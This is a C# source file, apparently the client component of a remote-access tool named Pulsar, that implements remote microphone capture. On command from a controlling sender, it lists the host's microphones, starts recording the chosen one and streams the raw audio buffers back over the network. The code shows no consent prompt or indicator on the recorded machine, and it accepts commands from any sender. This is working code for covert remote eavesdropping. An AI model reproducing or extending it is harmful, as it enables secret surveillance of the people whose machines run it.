using NAudio.CoreAudioApi;
using NAudio.Wave;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Audio;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;

namespace Pulsar.Client.Messages
{
    public class AudioHandler : NotificationMessageProcessor, IDisposable
    {
        public override bool CanExecute(IMessage message) => message is GetMicrophone ||
                                                             message is GetMicrophoneDevice;

        public override bool CanExecuteFrom(ISender sender) => true;

        public ISender _client;

        private bool _isStarted;

        public WaveInEvent _audioDevice;

        private int _deviceID;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetMicrophone msg:
                    Execute(sender, msg);
                    break;

                case GetMicrophoneDevice msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetMicrophone message)
        {
            if (message.CreateNew)
            {
                try
                {
                    _isStarted = false;
                    _audioDevice?.Dispose();
                    OnReport("Audio streaming started");
                }
                catch (Exception ex)
                {
                    OnReport($"Error during audio device cleanup: {ex.Message}");
                }
            }
            if (message.Destroy)
            {
                try
                {
                    Destroy();
                    OnReport("Audio streaming stopped");
                }
                catch (Exception ex)
                {
                    OnReport($"Error stopping audio: {ex.Message}");
                }
                return;
            }
            if (_client == null) _client = client;
            if (!_isStarted)
            {
                try
                {
                    _deviceID = message.DeviceIndex;

                    if (_deviceID < 0 || _deviceID >= WaveIn.DeviceCount)
                    {
                        OnReport($"Invalid microphone device index: {_deviceID}. Available devices: {WaveIn.DeviceCount}");
                        return;
                    }
                    var capabilities = WaveIn.GetCapabilities(_deviceID);
                    if (capabilities.Channels == 0)
                    {
                        OnReport($"Microphone device {_deviceID} has no available channels");
                        return;
                    }

                    OnReport($"Initializing microphone device {_deviceID}: {capabilities.ProductName}");

                    _audioDevice = new WaveInEvent
                    {
                        DeviceNumber = _deviceID,
                        WaveFormat = new WaveFormat(message.Bitrate, capabilities.Channels)
                    };
                    _audioDevice.BufferMilliseconds = 50;
                    _audioDevice.DataAvailable += sourcestream_DataAvailable;
                    _audioDevice.StartRecording();
                    _isStarted = true;
                }
                catch (ArgumentOutOfRangeException ex)
                {
                    OnReport($"Device index out of range: {ex.Message}");
                    _isStarted = false;
                }
                catch (InvalidOperationException ex)
                {
                    OnReport($"Invalid microphone operation: {ex.Message}");
                    _isStarted = false;
                }
                catch (System.Runtime.InteropServices.COMException ex)
                {
                    OnReport($"COM error accessing microphone: {ex.Message}");
                    _isStarted = false;
                }
                catch (UnauthorizedAccessException ex)
                {
                    OnReport($"Unauthorized access to microphone: {ex.Message}");
                    _isStarted = false;
                }
                catch (Exception ex)
                {
                    OnReport($"Unexpected error initializing microphone: {ex.Message}");
                    _isStarted = false;
                }
            }
        }

        private void sourcestream_DataAvailable(object notUsed, WaveInEventArgs e)
        {
            try
            {
                if (e?.Buffer == null || e.BytesRecorded <= 0)
                {
                    return;
                }

                byte[] rawAudio = new byte[e.BytesRecorded];
                Array.Copy(e.Buffer, rawAudio, e.BytesRecorded);

                _client?.Send(new GetMicrophoneResponse
                {
                    Audio = rawAudio,
                    Device = _deviceID
                });
            }
            catch (Exception ex)
            {
                OnReport($"Error processing microphone data: {ex.Message}");
            }
        }

        private void Execute(ISender client, GetMicrophoneDevice message)
        {
            try
            {
                var deviceList = new List<Tuple<int, string>>();

                int deviceCount = WaveIn.DeviceCount;
                for (int i = 0; i < deviceCount; i++)
                {
                    try
                    {
                        var capabilities = WaveIn.GetCapabilities(i);
                        string deviceName = capabilities.ProductName;

                        OnReport($"Found microphone device {i}: {deviceName} (Channels: {capabilities.Channels})");

                        if (!string.IsNullOrEmpty(deviceName) && capabilities.Channels > 0)
                        {
                            deviceList.Add(Tuple.Create(i, deviceName));
                        }
                    }
                    catch (Exception ex)
                    {
                        OnReport($"Error accessing microphone device {i}: {ex.Message}");
                    }
                }

                client.Send(new GetMicrophoneDeviceResponse { DeviceInfos = deviceList });
            }
            catch (Exception ex)
            {
                OnReport($"Error enumerating microphone devices: {ex.Message}");
                client.Send(new GetMicrophoneDeviceResponse { DeviceInfos = new List<Tuple<int, string>>() });
            }
        }

        public void Destroy()
        {
            try
            {
                if (_audioDevice != null)
                {
                    try
                    {
                        _audioDevice.DataAvailable -= sourcestream_DataAvailable;
                    }
                    catch (Exception ex)
                    {
                        OnReport($"Error unsubscribing from DataAvailable event: {ex.Message}");
                    }

                    try
                    {
                        if (_audioDevice.DeviceNumber >= 0) // Check if device is valid
                        {
                            _audioDevice.StopRecording();
                        }
                    }
                    catch (Exception ex)
                    {
                        OnReport($"Error stopping microphone recording: {ex.Message}");
                    }

                    try
                    {
                        _audioDevice.Dispose();
                    }
                    catch (Exception ex)
                    {
                        OnReport($"Error disposing microphone device: {ex.Message}");
                    }

                    _audioDevice = null;
                }
            }
            catch (Exception ex)
            {
                OnReport($"Error in Destroy method: {ex.Message}");
            }
            finally
            {
                _isStarted = false;
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                try
                {
                    Destroy();
                }
                catch (Exception ex)
                {
                    OnReport($"Error during disposal: {ex.Message}");
                }
            }
        }
    }
}